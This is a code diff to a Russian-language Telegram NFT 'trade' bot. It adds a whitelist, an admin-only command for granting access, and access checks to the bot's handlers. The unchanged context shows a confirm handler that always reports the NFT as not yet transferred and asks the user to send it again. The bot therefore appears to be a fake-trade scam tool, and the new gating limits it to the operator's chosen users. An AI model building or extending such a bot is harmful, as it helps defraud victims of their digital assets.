@@ -12,13 +12,56 @@ from aiogram.types import (
     InlineKeyboardMarkup, 
     InlineKeyboardButton,
     CallbackQuery,
-    LinkPreviewOptions
+    LinkPreviewOptions,
+    Message
 )
 
 logging.basicConfig(level=logging.INFO)
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 router = Router()
+
+# Доступ к inline-функционалу. Главный админ имеет доступ всегда.
+MAIN_ADMIN_ID = 8242418187
+ACCESS_FILE = os.getenv("ACCESS_FILE", "authorized_users.json")
+
+
+def load_authorized_users() -> set[int]:
+    """Загружает выданные доступы из JSON, сохраняя их между перезапусками."""
+    try:
+        import json
+        with open(ACCESS_FILE, "r", encoding="utf-8") as f:
+            raw = json.load(f)
+        users = {int(user_id) for user_id in raw}
+    except (FileNotFoundError, ValueError, TypeError, OSError):
+        users = set()
+    users.add(MAIN_ADMIN_ID)
+    return users
+
+
+def save_authorized_users(users: set[int]) -> None:
+    """Сохраняет доступы в JSON."""
+    import json
+    with open(ACCESS_FILE, "w", encoding="utf-8") as f:
+        json.dump(sorted(users), f, ensure_ascii=False, indent=2)
+
+
+AUTHORIZED_USERS = load_authorized_users()
+
+
+def has_access(user_id: int) -> bool:
+    return user_id in AUTHORIZED_USERS or user_id == MAIN_ADMIN_ID
+
+
+def grant_access(user_id: int) -> bool:
+    before = len(AUTHORIZED_USERS)
+    AUTHORIZED_USERS.add(user_id)
+    save_authorized_users(AUTHORIZED_USERS)
+    return len(AUTHORIZED_USERS) > before
+
+
+def access_status(user_id: int) -> str:
+    return "✅ Доступ есть" if has_access(user_id) else "❌ Доступа нет"
 
 # Кэш для хранения активных сделок
 TRADES_CACHE = {}
@@ -268,8 +311,45 @@ def currency_suggestions(
     ]
 
 
+@router.message(F.text.startswith("/доступ"))
+async def grant_access_handler(message: Message):
+    """Только MAIN_ADMIN_ID может выдавать доступ командой /доступ <telegram_id>."""
+    if message.from_user is None or message.from_user.id != MAIN_ADMIN_ID:
+        await message.answer("⛔ Только главный админ может выдавать доступ.")
+        return
+
+    parts = message.text.split() if message.text else []
+    if len(parts) != 2:
+        await message.answer("Использование: /доступ 123456789")
+        return
+
+    try:
+        user_id = int(parts[1])
+        if user_id <= 0:
+            raise ValueError
+    except ValueError:
+        await message.answer("❌ Нужен корректный Telegram ID, например: /доступ 123456789")
+        return
+
+    was_added = grant_access(user_id)
+    if was_added:
+        await message.answer(
+            f"✅ Доступ выдан пользователю <code>{user_id}</code>.\n"
+            "Теперь он может использовать inline-режим бота.",
+            parse_mode="HTML",
+        )
+    else:
+        await message.answer(f"ℹ️ У пользователя <code>{user_id}</code> доступ уже есть.", parse_mode="HTML")
+
+
 @router.inline_query()
 async def process_inline_trade(inline_query: InlineQuery):
+    # Без выданного доступа inline-режим намеренно возвращает пустой список.
+    # Поэтому при @offersorgbot у такого пользователя ничего не появляется.
+    if not has_access(inline_query.from_user.id):
+        await inline_query.answer([], cache_time=0, is_personal=True)
+        return
+
     query_text = inline_query.query.strip()
     args = query_text.split()
 
@@ -339,6 +419,10 @@ async def process_inline_trade(inline_query: InlineQuery):
 # ==========================================
 @router.callback_query(F.data.startswith("accept:"))
 async def accept_trade_handler(callback: CallbackQuery, bot: Bot):
+    if not callback.from_user or not has_access(callback.from_user.id):
+        await callback.answer("⛔ У вас нет доступа к боту.", show_alert=True)
+        return
+
     trade_id = callback.data.split(":")[1]
     trade = TRADES_CACHE.get(trade_id)
 
@@ -410,6 +494,10 @@ async def accept_trade_handler(callback: CallbackQuery, bot: Bot):
 # ==========================================
 @router.callback_query(F.data.startswith("confirm:"))
 async def confirm_transfer_handler(callback: CallbackQuery):
+    if not callback.from_user or not has_access(callback.from_user.id):
+        await callback.answer("⛔ У вас нет доступа к боту.", show_alert=True)
+        return
+
     await callback.answer(
         text="⚠️ Ошибка: Предмет еще не передан пользователю. Пожалуйста, передайте NFT и нажмите снова.", 
         show_alert=True
@@ -420,6 +508,10 @@ async def confirm_transfer_handler(callback: CallbackQuery):
 # ==========================================
 @router.callback_query(F.data.startswith("cancel:"))
 async def cancel_trade_handler(callback: CallbackQuery, bot: Bot):
+    if not callback.from_user or not has_access(callback.from_user.id):
+        await callback.answer("⛔ У вас нет доступа к боту.", show_alert=True)
+        return
+
     trade_id = callback.data.split(":")[1]
     TRADES_CACHE.pop(trade_id, None)
 
@@ -452,6 +544,7 @@ async def main():
     await site.start()
 
     bot = Bot(token=BOT_TOKEN)
+    logging.info("Authorized users loaded: %s", len(AUTHORIZED_USERS))
     dp = Dispatcher()
     dp.include_router(router)
     await dp.start_polling(bot)
